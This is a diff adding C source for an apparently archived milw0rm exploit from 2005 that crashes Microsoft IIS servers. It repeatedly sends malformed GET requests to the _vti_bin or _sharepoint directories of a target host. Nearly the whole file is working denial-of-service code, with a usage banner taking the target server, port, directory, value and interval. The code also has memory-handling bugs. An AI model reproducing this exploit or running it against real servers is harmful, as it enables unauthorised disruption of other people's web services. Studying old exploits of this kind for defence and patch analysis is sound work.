@@ -1,0 +1,122 @@
+/*
+Name: Microsoft IIS Malformed URI DoS (_vti_bin, _sharepoint) Exploit
+File: Microsoft.IIS.Malformed.URI.DoS.(_vti_bin,_sharepoint).cpp
+Author: Lympex
+Contact:
+        .- Mail: lympex[at]gmail[dot]com
+        .- Web: http://l-bytes.tk
+Date: 20/12/2005
+Info: http://www.securiteam.com/windowsntfocus/6E00E2KEUS.html
+*/
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <winsock2.h>
+#pragma comment(lib,"libws2_32.a")
+
+SOCKET Connect(char *Host, short Port)
+{
+	/*make the socket*/
+	WSADATA wsaData;
+	SOCKET Winsock;
+	/*structs*/
+	struct sockaddr_in Winsock_In;
+	struct hostent *Ip;
+
+	/*init*/
+	WSAStartup(MAKEWORD(2,2), &wsaData);
+	/*asociate*/
+	Winsock=WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP,NULL,(unsigned int)NULL,(unsigned int)NULL);
+	
+	//check the socket
+	if(Winsock==INVALID_SOCKET)
+	{
+		/*exit*/
+		WSACleanup();
+		return 1;
+	}
+
+	/*complete the struct*/
+	Ip=gethostbyname(Host);
+	Winsock_In.sin_port=htons(Port);
+	Winsock_In.sin_family=AF_INET;
+	Winsock_In.sin_addr.s_addr=inet_addr(inet_ntoa(*((struct in_addr *)Ip->h_addr)));
+
+	/*connection*/
+	if(WSAConnect(Winsock,(SOCKADDR*)&Winsock_In,sizeof(Winsock_In),NULL,NULL,NULL,NULL)==SOCKET_ERROR)
+	{
+		/*exit*/
+		WSACleanup();
+		return 1;
+	}
+
+	return Winsock;
+}
+
+/*****************/
+/* MAIN FUNCTION */
+/*****************/
+int main(int argc, char *argv[])
+{
+    printf("\n*******************************************************************");
+    printf("\n* Microsoft IIS Malformed URI DoS (_vti_bin, _sharepoint) Exploit *");
+    printf("\n*-----------------------------------------------------------------*");
+    printf("\n*  Coded by Lympex: lympex[at]gmail[dot]com && http://l-bytes.tk  *");
+    printf("\n*  Info: http://www.securiteam.com/windowsntfocus/6E00E2KEUS.html *");
+    printf("\n*******************************************************************\n");    
+    
+    if(argc!=6)
+    {
+               printf("\n[+] Usage: %s <server.com> <port> <directory> <value> <interval(ms)>",argv[0]);
+               printf("\n[+] Directories: \x22_vti_bin\x22 / \x22_sharepoint\x22");
+               printf("\n    (Directory must be set to \x22Scripts & Executables\x22");
+               printf("\n[+] Values: ~0, ~1, ~2, ~3, ~4, ~5, ~6, ~7, ~8, ~9\n");
+               return -1;
+    }
+    
+    BOOL Done=FALSE;
+    unsigned int i;
+    SOCKET DoS;
+    char *Request;
+    
+    printf("\n[+] Doing DoS Attack...");
+    Request=(char *)malloc((strlen("GET /")+strlen(argv[3])+strlen(argv[4])+strlen("/.dll/*\\\n\n"))*sizeof(char));
+    memset(Request,0,sizeof(Request));
+    //copy the request
+    strcpy(Request,"GET /");strcat(Request,argv[3]);strcat(Request,"/.dll/*\\");strcat(Request,argv[4]);strcat(Request,"\n\n");
+    
+    //make a bucle to do the attack
+    for(i=0;i<5;i++)
+    {
+                    DoS=Connect(argv[1],(short)atoi(argv[2]));
+                    //check the socket
+                    if(DoS==1)
+                    {
+                              Done=FALSE;
+                              break;
+                    }
+                    send(DoS,Request,strlen(Request),0);
+                    Sleep(100);
+                    WSACleanup();
+                    //check
+                    if(i==4)
+                    {
+                            Done=TRUE;
+                    }
+                    Sleep((DWORD)atoi(argv[5]));
+    }
+    
+    //check again
+    if(Done==TRUE)
+    {
+                  printf("DONE");
+    }else{
+          printf("ERROR - Server down?");
+    }
+    
+    LocalFree(Request);
+    return 0;
+}
+
+// milw0rm.com [2005-12-29]
